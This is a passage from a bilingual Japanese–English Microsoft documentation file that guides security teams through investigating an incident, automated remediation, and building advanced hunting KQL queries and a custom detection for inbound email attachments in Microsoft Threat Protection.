### <a name="review-the-device-timeline-microsoft-defender-atp"></a><span data-ttu-id="7f058-217">デバイスのタイムラインを確認する [Microsoft Defender ATP]</span><span class="sxs-lookup"><span data-stu-id="7f058-217">Review the device timeline [Microsoft Defender ATP]</span></span>
<span data-ttu-id="7f058-218">このインシデントのさまざまなアラートを調査した後、前に調査したインシデントページに戻ります。</span><span class="sxs-lookup"><span data-stu-id="7f058-218">After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier.</span></span> <span data-ttu-id="7f058-219">[インシデント] ページの [ **デバイス** ] タブをクリックして、MICROSOFT Defender Atp および Azure atp で報告された、このインシデントに関連するデバイスを確認します。</span><span class="sxs-lookup"><span data-stu-id="7f058-219">Click the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender ATP and Azure ATP.</span></span>

<span data-ttu-id="7f058-220">攻撃が行われたデバイスの名前をクリックして、その特定のデバイスのエンティティページを開きます。</span><span class="sxs-lookup"><span data-stu-id="7f058-220">Click the name of the device where the attack was conducted, to open the entity page for that specific device.</span></span> <span data-ttu-id="7f058-221">そのページには、トリガーされた通知と関連するイベントが表示されます。</span><span class="sxs-lookup"><span data-stu-id="7f058-221">In that page, you can see alerts that were triggered and related events.</span></span>

<span data-ttu-id="7f058-222">[ **タイムライン** ] タブをクリックしてデバイスのタイムラインを開き、デバイス上で監視されているすべてのイベントと動作を、発生したアラートとともに時系列順に表示します。</span><span class="sxs-lookup"><span data-stu-id="7f058-222">Click the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.</span></span>

![動作があるデバイスのタイムラインのスクリーンショット](../../media/mtp/fig11.png) 

<span data-ttu-id="7f058-224">重要な動作の一部を展開すると、プロセスツリーなどの有用な情報を得られます。</span><span class="sxs-lookup"><span data-stu-id="7f058-224">Expanding some of the more interesting behaviors provides useful details, such as process trees.</span></span>

<span data-ttu-id="7f058-225">たとえば、 **疑わしいプロセスインジェクション**のアラートイベントが見つかるまで下にスクロールします。</span><span class="sxs-lookup"><span data-stu-id="7f058-225">For example, scroll down until you find the alert event **Suspicious process injection observed**.</span></span> <span data-ttu-id="7f058-226">その下の [process event] に挿入された **powershell.exe notepad.exe を** クリックして、この動作の完全なプロセスツリーをサイドペインの [ **event entities** ] グラフに表示します。</span><span class="sxs-lookup"><span data-stu-id="7f058-226">Click the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane.</span></span> <span data-ttu-id="7f058-227">必要に応じて、検索バーを使用してフィルター処理を行います。</span><span class="sxs-lookup"><span data-stu-id="7f058-227">Use the search bar for filtering if necessary.</span></span>

![選択した PowerShell ファイル作成動作のプロセスツリーのスクリーンショット](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a><span data-ttu-id="7f058-229">ユーザー情報を確認する [Microsoft Cloud App Security]</span><span class="sxs-lookup"><span data-stu-id="7f058-229">Review the user information [Microsoft Cloud App Security]</span></span>

<span data-ttu-id="7f058-230">[インシデント] ページで、[ **ユーザー** ] タブをクリックして、攻撃に関与するユーザーの一覧を表示します。</span><span class="sxs-lookup"><span data-stu-id="7f058-230">On the incident page, click the **Users** tab to display the list of users involved in the attack.</span></span> <span data-ttu-id="7f058-231">この表には、各ユーザーの **調査の優先度** のスコアを含む、各ユーザーに関する追加情報が含まれています。</span><span class="sxs-lookup"><span data-stu-id="7f058-231">The table contains additional information about each user, including each user’s **Investigation Priority** score.</span></span>

<span data-ttu-id="7f058-232">[ユーザー名] をクリックして、詳細な調査を実施できるユーザーのプロファイルページを開きます。</span><span class="sxs-lookup"><span data-stu-id="7f058-232">Click the username to open the user’s profile page where further investigation can be conducted.</span></span> <span data-ttu-id="7f058-233">[「リスク](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify)のあるユーザーの調査」を参照してください。</span><span class="sxs-lookup"><span data-stu-id="7f058-233">[Read more about investigating risky users](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify).</span></span>
<br>
<span data-ttu-id="7f058-234">![Cloud App Security のユーザーページのスクリーンショット](../../media/mtp/fig13.png)</span><span class="sxs-lookup"><span data-stu-id="7f058-234">![Screenshot of Cloud App Security user page](../../media/mtp/fig13.png)</span></span>


## <a name="automated-investigation-and-remediation"></a><span data-ttu-id="7f058-235">調査と修復の自動化</span><span class="sxs-lookup"><span data-stu-id="7f058-235">Automated investigation and remediation</span></span>
>[!NOTE]
><span data-ttu-id="7f058-236">このシミュレーションについて説明する前に、次のビデオを見て、自動自己修復の概要、ポータル内での検索方法、およびセキュリティ操作においてどのように役立つかについて理解しておく必要があります。</span><span class="sxs-lookup"><span data-stu-id="7f058-236">Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

<span data-ttu-id="7f058-237">Microsoft 365 セキュリティセンターポータルで、インシデントに移動します。</span><span class="sxs-lookup"><span data-stu-id="7f058-237">Navigate back to the incident in the Microsoft 365 Security Center portal.</span></span> <span data-ttu-id="7f058-238">[**インシデント**] ページの [**調査**] タブには、Azure ATP および Microsoft Defender atp によってトリガーされた自動調査が表示されます。</span><span class="sxs-lookup"><span data-stu-id="7f058-238">The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Azure ATP and Microsoft Defender ATP.</span></span> <span data-ttu-id="7f058-239">次のスクリーンショットは、Microsoft Defender ATP がトリガーする自動調査のみを示しています。</span><span class="sxs-lookup"><span data-stu-id="7f058-239">The screenshot below displays only the automated investigation triggered by Microsoft Defender ATP.</span></span> <span data-ttu-id="7f058-240">既定では、Microsoft Defender ATP は、修復が必要なキューにある成果物を自動的に remediates します。</span><span class="sxs-lookup"><span data-stu-id="7f058-240">By default, Microsoft Defender ATP automatically remediates the artifacts found in the queue which requires remediation.</span></span>

![インシデントに関連する自動調査のスクリーンショット](../../media/mtp/fig14.png)

<span data-ttu-id="7f058-242">調査をトリガーした通知をクリックして、[ **調査の詳細** ] ページを開きます。</span><span class="sxs-lookup"><span data-stu-id="7f058-242">Click the alert that triggered an investigation to open the **Investigation details** page.</span></span> <span data-ttu-id="7f058-243">次のように表示されます。</span><span class="sxs-lookup"><span data-stu-id="7f058-243">You’ll see the following:</span></span>
- <span data-ttu-id="7f058-244">自動調査をトリガーした警告。</span><span class="sxs-lookup"><span data-stu-id="7f058-244">Alert(s) that triggered the automated investigation.</span></span>
- <span data-ttu-id="7f058-245">影響を受けるユーザーとデバイス。</span><span class="sxs-lookup"><span data-stu-id="7f058-245">Impacted users and devices.</span></span> <span data-ttu-id="7f058-246">その他のデバイスでインジケーターが見つかった場合は、これらの追加デバイスも一覧に表示されます。</span><span class="sxs-lookup"><span data-stu-id="7f058-246">If indicators are found on additional devices, these additional devices will be listed as well.</span></span>
- <span data-ttu-id="7f058-247">証拠の一覧。</span><span class="sxs-lookup"><span data-stu-id="7f058-247">List of evidence.</span></span> <span data-ttu-id="7f058-248">ファイル、プロセス、サービス、ドライバー、およびネットワークアドレスなど、検出され分析されたエンティティ。</span><span class="sxs-lookup"><span data-stu-id="7f058-248">The entities found and analyzed, such as files, processes, services, drivers, and network addresses.</span></span> <span data-ttu-id="7f058-249">これらのエンティティは、アラートとの関係があるかどうかを分析し、無害または悪意のあるものとして評価されます。</span><span class="sxs-lookup"><span data-stu-id="7f058-249">These entities are analyzed for possible relationships to the alert and rated as benign or malicious.</span></span>
- <span data-ttu-id="7f058-250">検出された脅威。</span><span class="sxs-lookup"><span data-stu-id="7f058-250">Threats found.</span></span> <span data-ttu-id="7f058-251">調査中に検出された既知の脅威。</span><span class="sxs-lookup"><span data-stu-id="7f058-251">Known threats that are found during the investigation.</span></span>

>[!NOTE]
><span data-ttu-id="7f058-252">タイミングによっては、自動調査がまだ実行中の場合があります。</span><span class="sxs-lookup"><span data-stu-id="7f058-252">Depending on timing, the automated investigation might still be running.</span></span> <span data-ttu-id="7f058-253">証拠を収集して分析し、結果を確認する前に、プロセスが完了するまで数分待機します。</span><span class="sxs-lookup"><span data-stu-id="7f058-253">Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results.</span></span> <span data-ttu-id="7f058-254">[ **調査の詳細** ] ページを更新して、最新の調査結果を取得します。</span><span class="sxs-lookup"><span data-stu-id="7f058-254">Refresh the **Investigation details** page to get the latest findings.</span></span>

![調査の詳細ページのスクリーンショット](../../media/mtp/fig15.png)

<span data-ttu-id="7f058-256">自動調査の間、Microsoft Defender ATP は、修復を必要とする成果物の1つとして挿入された notepad.exe プロセスを特定しました。</span><span class="sxs-lookup"><span data-stu-id="7f058-256">During the automated investigation, Microsoft Defender ATP identified the notepad.exe process, which was injected as one of the artifacts requiring remediation.</span></span> <span data-ttu-id="7f058-257">Microsoft Defender ATP は自動修復の一部として、不審なプロセスインジェクションを自動的に停止します。</span><span class="sxs-lookup"><span data-stu-id="7f058-257">Microsoft Defender ATP automatically stops the suspicious process injection as part of the automated remediation.</span></span> 

<span data-ttu-id="7f058-258">テストデバイス上の実行中のプロセスの一覧から <i>notepad.exe</i> が表示されなくなります。</span><span class="sxs-lookup"><span data-stu-id="7f058-258">You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.</span></span>

## <a name="resolve-the-incident"></a><span data-ttu-id="7f058-259">インシデントを解決する</span><span class="sxs-lookup"><span data-stu-id="7f058-259">Resolve the incident</span></span>

<span data-ttu-id="7f058-260">調査が完了し、修復が確認されたら、インシデントを閉じます。</span><span class="sxs-lookup"><span data-stu-id="7f058-260">After the investigation is complete and confirmed to be remediated, close the incident.</span></span>

<span data-ttu-id="7f058-261">[ **インシデントの管理**] をクリックします。</span><span class="sxs-lookup"><span data-stu-id="7f058-261">Click **Manage incident**.</span></span> <span data-ttu-id="7f058-262">[ **インシデントを解決** する] の状態を設定し、関連する分類を選択します。</span><span class="sxs-lookup"><span data-stu-id="7f058-262">Set the status to **Resolve incident** and select the relevant classification.</span></span>

<span data-ttu-id="7f058-263">インシデントが解決されると、Microsoft 365 セキュリティセンターおよび関連するポータルで、関連付けられているすべての警告が閉じられます。</span><span class="sxs-lookup"><span data-stu-id="7f058-263">Once the incident is resolved, it will close all of the associated alerts in Microsoft 365 Security Center and in the related portals.</span></span>

![開いている [インシデントの管理] パネルがある [インシデント] ページのスクリーンショット。インシデントを解決するためにスイッチをクリックできます。](../../media/mtp/fig16.png) 

<br>
<span data-ttu-id="7f058-265">これにより、インシデント管理および自動調査と修復のシナリオに対する攻撃シミュレーションがラップされます。</span><span class="sxs-lookup"><span data-stu-id="7f058-265">This wraps up the attack simulation for the incident management and automated investigation and remediation scenarios.</span></span> <span data-ttu-id="7f058-266">次のシミュレーションでは、悪意のある可能性のあるファイルを事前に脅威から探すことができるようになります。</span><span class="sxs-lookup"><span data-stu-id="7f058-266">The next simulation will take you through proactive threat hunting for potentially-malicious files.</span></span> 

## <a name="advanced-hunting-scenario"></a><span data-ttu-id="7f058-267">高度な検索のシナリオ</span><span class="sxs-lookup"><span data-stu-id="7f058-267">Advanced hunting scenario</span></span>

>[!NOTE]
><span data-ttu-id="7f058-268">シミュレーションについて説明する前に、次のビデオを見て、高度な検索の概念について理解し、ポータルで検索できる場所を確認し、セキュリティの操作でどのように役立つかを確認してください。</span><span class="sxs-lookup"><span data-stu-id="7f058-268">Before we walk you through the simulation, watch the following video to understand the advanced hunting concepts, see where you can find it in the portal, and know how it can help you in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a><span data-ttu-id="7f058-269">探している環境の要件</span><span class="sxs-lookup"><span data-stu-id="7f058-269">Hunting environment requirements</span></span>
<span data-ttu-id="7f058-270">このシナリオでは、1つの内部メールボックスとデバイスが必要です。</span><span class="sxs-lookup"><span data-stu-id="7f058-270">There is a single internal mailbox and device required for this scenario.</span></span> <span data-ttu-id="7f058-271">テストメッセージを送信するには、外部の電子メールアカウントも必要です。</span><span class="sxs-lookup"><span data-stu-id="7f058-271">You will also need an external email account to send the test message.</span></span>

1.  <span data-ttu-id="7f058-272">テナントが [Microsoft の脅威保護を有効](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)にしていることを確認します。</span><span class="sxs-lookup"><span data-stu-id="7f058-272">Verify that your tenant has [enabled Microsoft Threat Protection](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span></span>
2.  <span data-ttu-id="7f058-273">電子メールの受信に使用するターゲットメールボックスを識別します。</span><span class="sxs-lookup"><span data-stu-id="7f058-273">Identify a target mailbox to be used for receiving email.</span></span>
    <span data-ttu-id="7f058-274">a.</span><span class="sxs-lookup"><span data-stu-id="7f058-274">a.</span></span>  <span data-ttu-id="7f058-275">このメールボックスは、Office 365 ATP b で監視する必要があります。</span><span class="sxs-lookup"><span data-stu-id="7f058-275">This mailbox must be monitored by Office 365 ATP b.</span></span>  <span data-ttu-id="7f058-276">要件3のデバイスがこのメールボックスにアクセスする必要がある</span><span class="sxs-lookup"><span data-stu-id="7f058-276">The device from requirement 3 needs to access this mailbox</span></span>
3.  <span data-ttu-id="7f058-277">テストデバイスを構成する: a。</span><span class="sxs-lookup"><span data-stu-id="7f058-277">Configure a test device: a.</span></span>  <span data-ttu-id="7f058-278">Windows 10 バージョン1903以降のバージョンを使用していることを確認してください。</span><span class="sxs-lookup"><span data-stu-id="7f058-278">Make sure you are using Windows 10 version 1903 or later version.</span></span>
    <span data-ttu-id="7f058-279">b.</span><span class="sxs-lookup"><span data-stu-id="7f058-279">b.</span></span>  <span data-ttu-id="7f058-280">テストデバイスをテストドメインに参加させる。</span><span class="sxs-lookup"><span data-stu-id="7f058-280">Join the test device to the test domain.</span></span>
    <span data-ttu-id="7f058-281">c. </span><span class="sxs-lookup"><span data-stu-id="7f058-281">c.</span></span>  <span data-ttu-id="7f058-282">[Windows Defender ウイルス対策を有効](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)にします。</span><span class="sxs-lookup"><span data-stu-id="7f058-282">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="7f058-283">Windows Defender ウイルス対策を有効にする際に問題が発生した場合は、 [このトラブルシューティングのトピック](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)を参照してください。</span><span class="sxs-lookup"><span data-stu-id="7f058-283">If you are having trouble enabling Windows Defender Antivirus, see [this troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    <span data-ttu-id="7f058-284">d. </span><span class="sxs-lookup"><span data-stu-id="7f058-284">d.</span></span>  <span data-ttu-id="7f058-285">[Microsoft Defender Advanced Threat Protection (MDATP) にオンボード](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)。</span><span class="sxs-lookup"><span data-stu-id="7f058-285">[Onboard to Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

### <a name="run-the-simulation"></a><span data-ttu-id="7f058-286">シミュレーションを実行する</span><span class="sxs-lookup"><span data-stu-id="7f058-286">Run the simulation</span></span>
1.  <span data-ttu-id="7f058-287">外部の電子メールアカウントから、「テスト環境の要件」セクションのステップ2で識別されたメールボックスに電子メールを送信します。</span><span class="sxs-lookup"><span data-stu-id="7f058-287">From an external email account, send an email to the mailbox identified in step 2 of the test environment requirements section.</span></span> <span data-ttu-id="7f058-288">既存の電子メールフィルターポリシーを使用して許可される添付ファイルを含めます。</span><span class="sxs-lookup"><span data-stu-id="7f058-288">Include an attachment that will be allowed through any existing email filter policies.</span></span>  <span data-ttu-id="7f058-289">このファイルは、悪意または実行可能である必要はありません。</span><span class="sxs-lookup"><span data-stu-id="7f058-289">This file does not need to be malicious or an executable.</span></span> <span data-ttu-id="7f058-290">推奨されるファイルの種類は、 <i>.pdf</i>、 <i>.exe</i> (許可されている場合)、または Word ファイルなどの Office ドキュメントです。</span><span class="sxs-lookup"><span data-stu-id="7f058-290">Suggested file types are <i>.pdf</i>, <i>.exe</i> (if allowed), or Office document such as a Word file.</span></span>
2.  <span data-ttu-id="7f058-291">[テスト環境の要件] セクションのステップ3で定義されたデバイスから、送信された電子メールを開きます。</span><span class="sxs-lookup"><span data-stu-id="7f058-291">Open the sent email from the device configured as defined in step 3 of the test environment requirements section.</span></span> <span data-ttu-id="7f058-292">添付ファイルを開くか、デバイスにファイルを保存します。</span><span class="sxs-lookup"><span data-stu-id="7f058-292">Either open the attachment or save the file to the device.</span></span>


<span data-ttu-id="7f058-293">**検索を探す**</span><span class="sxs-lookup"><span data-stu-id="7f058-293">**Go hunting**</span></span>
1.  <span data-ttu-id="7f058-294">Security.microsoft.com ポータルを開きます。</span><span class="sxs-lookup"><span data-stu-id="7f058-294">Open the security.microsoft.com portal.</span></span>
2.  <span data-ttu-id="7f058-295">[検索] **> [詳細**] を探します。</span><span class="sxs-lookup"><span data-stu-id="7f058-295">Navigate to **Hunting > Advanced hunting**.</span></span>

    ![M365 セキュリティセンターポータルのナビゲーションバーでの高度な検索のスクリーンショット](../../media/mtp/fig17.png) 

3.  <span data-ttu-id="7f058-297">電子メールイベントを収集することによって開始するクエリを作成します。</span><span class="sxs-lookup"><span data-stu-id="7f058-297">Build a query that starts by gathering email events.</span></span>
    <span data-ttu-id="7f058-298">a.</span><span class="sxs-lookup"><span data-stu-id="7f058-298">a.</span></span>  <span data-ttu-id="7f058-299">[クエリ] ウィンドウで、[新規] を選択します。</span><span class="sxs-lookup"><span data-stu-id="7f058-299">From the query pane, select New.</span></span>
    <span data-ttu-id="7f058-300">b.</span><span class="sxs-lookup"><span data-stu-id="7f058-300">b.</span></span>  <span data-ttu-id="7f058-301">[EmailEvents] テーブルをスキーマからダブルクリックします。</span><span class="sxs-lookup"><span data-stu-id="7f058-301">Double-click on the EmailEvents table from the schema.</span></span>

```
EmailEvents 
```                                        

   <span data-ttu-id="7f058-302">c. </span><span class="sxs-lookup"><span data-stu-id="7f058-302">c.</span></span>   <span data-ttu-id="7f058-303">時間枠を過去24時間に変更します。</span><span class="sxs-lookup"><span data-stu-id="7f058-303">Change the time frame to the last 24 hours.</span></span> <span data-ttu-id="7f058-304">上記のシミュレーションを実行したときに送信した電子メールが過去24時間であったとして、そうでない場合は、時間枠を変更します。</span><span class="sxs-lookup"><span data-stu-id="7f058-304">Assuming the email you sent when you ran the simulation above was in the past 24 hours, otherwise change the time frame.</span></span>
   <span data-ttu-id="7f058-305">![タイムフレームを変更できる場所のスクリーンショット。</span><span class="sxs-lookup"><span data-stu-id="7f058-305">![Screenshot of where you can change the time frame.</span></span> <span data-ttu-id="7f058-306">ドロップダウンメニューを開いて、時間枠オプションの範囲から選択する](../../media/mtp/fig18.png)</span><span class="sxs-lookup"><span data-stu-id="7f058-306">Open the drop-down menu to choose from range of time frame options](../../media/mtp/fig18.png)</span></span> 


   <span data-ttu-id="7f058-307">d. </span><span class="sxs-lookup"><span data-stu-id="7f058-307">d.</span></span>   <span data-ttu-id="7f058-308">クエリを実行します。</span><span class="sxs-lookup"><span data-stu-id="7f058-308">Run the query.</span></span>  <span data-ttu-id="7f058-309">パイロットの環境によっては、多くの結果が得られる場合があります。</span><span class="sxs-lookup"><span data-stu-id="7f058-309">You may have many results depending on the environment for the pilot.</span></span>  

>[!NOTE]
><span data-ttu-id="7f058-310">データの戻りを制限するには、フィルターオプションの次の手順を参照してください。</span><span class="sxs-lookup"><span data-stu-id="7f058-310">See the next step for filtering options to limit data return.</span></span>

   ![高度な検索クエリ結果のスクリーンショット](../../media/mtp/fig19.png) 

>[!NOTE]
><span data-ttu-id="7f058-312">高度な検索では、クエリ結果が表形式のデータとして表示されます。</span><span class="sxs-lookup"><span data-stu-id="7f058-312">Advanced hunting displays query results as tabular data.</span></span> <span data-ttu-id="7f058-313">グラフなどの他の形式のデータの表示を選択することもできます。</span><span class="sxs-lookup"><span data-stu-id="7f058-313">You can also opt to view the data in other format types such as charts.</span></span>    

   <span data-ttu-id="7f058-314">e. </span><span class="sxs-lookup"><span data-stu-id="7f058-314">e.</span></span>   <span data-ttu-id="7f058-315">結果を確認し、開いた電子メールを識別できるかどうかを確認します。</span><span class="sxs-lookup"><span data-stu-id="7f058-315">Look at the results and see if you can identify the email you opened.</span></span>  <span data-ttu-id="7f058-316">高度な検索でメッセージが表示されるまでに最大2時間かかる場合があります。</span><span class="sxs-lookup"><span data-stu-id="7f058-316">It may take up to 2 hours for the message to show up in advanced hunting.</span></span> <span data-ttu-id="7f058-317">メール環境が大きく、多くの結果がある場合は、[ **フィルターの表示] オプション** を使用してメッセージを検索することもできます。</span><span class="sxs-lookup"><span data-stu-id="7f058-317">If the email environment is large and there are many results, you might want to use the **Show Filters option** to find the message.</span></span> 

   <span data-ttu-id="7f058-318">このサンプルでは、電子メールは Yahoo アカウントから送信されました。</span><span class="sxs-lookup"><span data-stu-id="7f058-318">In the sample, the email was sent from a Yahoo account.</span></span> <span data-ttu-id="7f058-319">[ **+** SenderFromDomain] セクションの下にある **yahoo.com** の横のアイコンをクリックし、[ **適用** ] をクリックして、選択したドメインをクエリに追加します。</span><span class="sxs-lookup"><span data-stu-id="7f058-319">Click the **+** icon beside **yahoo.com** under the SenderFromDomain section and then click **Apply** to add the selected domain to the query.</span></span>  <span data-ttu-id="7f058-320">テストメッセージの送信に使用したドメインまたはメールアカウントは、「シミュレーションを実行して結果をフィルター処理する」の手順1で使用します。</span><span class="sxs-lookup"><span data-stu-id="7f058-320">You should use the domain or email account that was used to send the test message in step 1 of Run the Simulation to filter your results.</span></span>  <span data-ttu-id="7f058-321">クエリをもう一度実行して、シミュレーションからのメッセージが表示されることを確認するために、小さな結果セットを取得します。</span><span class="sxs-lookup"><span data-stu-id="7f058-321">Run the query again to get a smaller result set to verify that you see the message from the simulation.</span></span>
   
   ![フィルターのスクリーンショット。](../../media/mtp/fig20.png) 


```
EmailEvents 
| where SenderMailFromDomain == "yahoo.com"
```

   <span data-ttu-id="7f058-324">f.</span><span class="sxs-lookup"><span data-stu-id="7f058-324">f.</span></span>   <span data-ttu-id="7f058-325">クエリから結果の行をクリックして、レコードを検査できるようにします。</span><span class="sxs-lookup"><span data-stu-id="7f058-325">Click the resulting rows from the query so you can inspect the record.</span></span>
   <span data-ttu-id="7f058-326">![高度な検索結果が選択されたときに開く、[レコードの検査] パネルのスクリーンショット](../../media/mtp/fig21.png)</span><span class="sxs-lookup"><span data-stu-id="7f058-326">![Screenshot of the inspect record side panel which opens up when an advanced hunting result is selected](../../media/mtp/fig21.png)</span></span> 


4.  <span data-ttu-id="7f058-327">これで、電子メールが表示されることを確認できたので、添付ファイルのフィルターを追加します。</span><span class="sxs-lookup"><span data-stu-id="7f058-327">Now that you have verified that you can see the email, add a filter for the attachments.</span></span> <span data-ttu-id="7f058-328">環境内の添付ファイルを含むすべての電子メールにフォーカスします。</span><span class="sxs-lookup"><span data-stu-id="7f058-328">Focus on all emails with attachments in the environment.</span></span> <span data-ttu-id="7f058-329">このシナリオでは、受信メールに焦点を絞り、環境から送信されるものではありません。</span><span class="sxs-lookup"><span data-stu-id="7f058-329">For this scenario, focus on inbound emails, not those that are being sent out from your environment.</span></span> <span data-ttu-id="7f058-330">追加したフィルターを削除してメッセージを見つけ、"|" を追加します。**attachmentcount > 0**および**emaildirection**"  ==  **Inbound" "**</span><span class="sxs-lookup"><span data-stu-id="7f058-330">Remove any filters you have added to locate your message and add “| where **AttachmentCount > 0** and **EmailDirection** == **“Inbound””**</span></span>

<span data-ttu-id="7f058-331">次のクエリは、すべての電子メールイベントの最初のクエリよりも短い一覧で結果を表示します。</span><span class="sxs-lookup"><span data-stu-id="7f058-331">The following query will show you the result with a shorter list than your initial query for all email events:</span></span>

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"

```

5.  <span data-ttu-id="7f058-332">次に、添付ファイルについての情報 (ファイル名、ハッシュなど) を結果セットに追加します。</span><span class="sxs-lookup"><span data-stu-id="7f058-332">Next, include the information about the attachment (such as: file name, hashes) to your result set.</span></span> <span data-ttu-id="7f058-333">これを行うには、 **Emailattachmentinfo** テーブルに参加します。</span><span class="sxs-lookup"><span data-stu-id="7f058-333">To do so, join the **EmailAttachmentInfo** table.</span></span> <span data-ttu-id="7f058-334">この場合、参加に使用する共通のフィールドは、 **Networkmessageid** と **RecipientObjectId**です。</span><span class="sxs-lookup"><span data-stu-id="7f058-334">The common fields to use for joining, in this case are **NetworkMessageId** and **RecipientObjectId**.</span></span>

<span data-ttu-id="7f058-335">次のクエリにも追加行 "|" が含まれています。 **プロジェクト-** 電子メールとタイムスタンプの名前を変更するには、次の手順で追加するファイル操作に関連するメールとタイムスタンプに関連するタイムスタンプを識別するのに役立ちます。</span><span class="sxs-lookup"><span data-stu-id="7f058-335">The following query also includes an additional line “| **project-rename EmailTimestamp=Timestamp**” that will help identify which timestamp was related to the email versus timestamps related to file actions which you will add in the next step.</span></span>

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"
| project-rename EmailTimestamp=Timestamp 
| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
```

6.  <span data-ttu-id="7f058-336">次に、 **Emailattachmentinfo**テーブルの**SHA256**値を使用して、そのハッシュの**devicefileevents** (エンドポイントで発生したファイルアクション) を検索します。</span><span class="sxs-lookup"><span data-stu-id="7f058-336">Next, use the **SHA256** value from the **EmailAttachmentInfo** table to find **DeviceFileEvents** (file actions that happened on the endpoint) for that hash.</span></span>  <span data-ttu-id="7f058-337">ここに示す共通のフィールドは、添付ファイルの SHA256 ハッシュです。</span><span class="sxs-lookup"><span data-stu-id="7f058-337">The common field here will be the SHA256 hash for the attachment.</span></span>

<span data-ttu-id="7f058-338">生成されたテーブルにはエンドポイント (Microsoft Defender ATP) の詳細が含まれるようになりました (この場合は、FileCreated イベントのみを対象としてフィルター処理された)、ファイルが保存されていたこと</span><span class="sxs-lookup"><span data-stu-id="7f058-338">The resulting table now includes details from the endpoint (Microsoft Defender ATP) such as device name, what action was done (in this case, filtered to only include FileCreated events), and where the file was stored.</span></span> <span data-ttu-id="7f058-339">プロセスに関連付けられているアカウント名も含まれます。</span><span class="sxs-lookup"><span data-stu-id="7f058-339">The account name associated with the process will also be included.</span></span>

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"
| project-rename EmailTimestamp=Timestamp 
| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
| join DeviceFileEvents on SHA256 
| where ActionType == "FileCreated"
```

<span data-ttu-id="7f058-340">これで、ユーザーが添付ファイルを開いた、または保存したすべての受信メールを識別するクエリが作成されました。</span><span class="sxs-lookup"><span data-stu-id="7f058-340">You have now created a query that will identify all inbound emails where the user opened or saved the attachment.</span></span> <span data-ttu-id="7f058-341">また、このクエリを調整して、特定の送信者ドメイン、ファイルサイズ、ファイルの種類などをフィルター処理することもできます。</span><span class="sxs-lookup"><span data-stu-id="7f058-341">You can also refine this query to filter for specific sender domains, file sizes, file types, and so on.</span></span>

7.  <span data-ttu-id="7f058-342">関数は特別な結合の一種であり、そのファイルの流行、署名者、発行者の情報など、より多くの TI データを取得することができます。 ファイルの詳細を取得するには、 **Fileprofile ()** 関数エンリッチメントを使用します。</span><span class="sxs-lookup"><span data-stu-id="7f058-342">Functions are a special sort of join which let you pull more TI data about a file like its prevalence, signer and issuer info, etc.  To get more details on the file, use the **FileProfile()** function enrichment:</span></span>

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"
| project-rename EmailTimestamp=Timestamp 
| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
| join DeviceFileEvents on SHA256 
| where ActionType == "FileCreated"
| distinct SHA1
| invoke FileProfile()
```


<span data-ttu-id="7f058-343">**検出を作成する**</span><span class="sxs-lookup"><span data-stu-id="7f058-343">**Create a detection**</span></span>

<span data-ttu-id="7f058-344">後で発生する場合に **警告を取得** する情報を識別するクエリを作成したら、クエリからカスタム検出を作成できます。</span><span class="sxs-lookup"><span data-stu-id="7f058-344">Once you have created a query that identifies information that you would like to **get alerted** about if they happen in the future, you can create a custom detection from the query.</span></span> 

<span data-ttu-id="7f058-345">カスタム検出は、設定した頻度に従ってクエリを実行し、クエリの結果によって、選択した影響を受ける影響を受けたリソースに基づいてセキュリティ警告が作成されます。</span><span class="sxs-lookup"><span data-stu-id="7f058-345">Custom detections will run the query according to the frequency you set, and the results of the queries will create security alerts, based on the impacted assets you choose.</span></span> <span data-ttu-id="7f058-346">これらのアラートは、インシデントに関連付けられ、いずれかの製品によって生成された他のセキュリティ警告としてトリアージできます。</span><span class="sxs-lookup"><span data-stu-id="7f058-346">Those alerts will be correlated to incidents and can be triaged as any other security alert generated by one of the products.</span></span>

1.  <span data-ttu-id="7f058-347">[クエリ] ページで、「検索」の手順7で追加した7行と8行を削除し、[ **検出ルールの作成**] をクリックします。</span><span class="sxs-lookup"><span data-stu-id="7f058-347">On the query page, remove lines 7 and 8 that were added in step 7 of the Go hunting instructions and click **Create detection rule**.</span></span> 
    
    ![高度な検索ページの [検出ルールの作成] をクリックできる場所のスクリーンショット](../../media/mtp/fig22.png) 

>[!NOTE]
